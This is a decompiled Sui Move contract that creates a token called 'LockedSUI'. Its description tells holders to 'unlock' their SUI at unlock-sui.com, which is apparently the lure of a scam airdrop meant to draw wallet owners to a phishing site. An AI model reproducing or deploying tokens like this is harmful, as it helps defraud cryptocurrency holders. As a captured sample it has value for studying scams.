module 0x90ccd0df88e11121c7ac6e0daf75514f854b3ed8b161f513df8ede97c94fb7a1::locked_sui {
    struct LOCKED_SUI has drop {
        dummy_field: bool,
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<LOCKED_SUI>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<LOCKED_SUI>>(0x2::coin::mint<LOCKED_SUI>(arg0, arg1, arg3), arg2);
    }

    fun init(arg0: LOCKED_SUI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1) = 0x2::coin::create_currency<LOCKED_SUI>(arg0, 9, b"LockedSUI", b"Unlock at unlock-sui.com", b"Unlock your SUI at unlock-sui.com", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://files.catbox.moe/hzvsr9.png")), arg1);
        let v2 = v0;
        0x2::transfer::public_transfer<0x2::coin::Coin<LOCKED_SUI>>(0x2::coin::mint<LOCKED_SUI>(&mut v2, 1000000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::CoinMetadata<LOCKED_SUI>>(v1, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<LOCKED_SUI>>(v2, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

